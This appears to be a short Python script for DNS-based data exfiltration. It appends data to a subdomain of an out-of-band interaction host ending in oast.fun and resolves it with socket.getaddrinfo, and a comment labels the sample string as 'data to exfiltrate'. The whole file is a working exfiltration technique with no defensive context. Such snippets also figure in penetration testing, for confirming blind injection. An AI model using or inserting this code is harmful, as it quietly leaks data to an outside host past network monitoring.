import socket

def dns_query(data):
    try:
        # Construct a DNS query where the data is appended to the subdomain
        query = f"{data}.yqyueeqdvtgsilyleffvzzvoowz6itl52.oast.fun" 
        socket.getaddrinfo(query, None)
    except Exception as e:
        print(f"Error: {e}")

# Example data to exfiltrate
data = "payload_data_or_command_output"
dns_query(data)
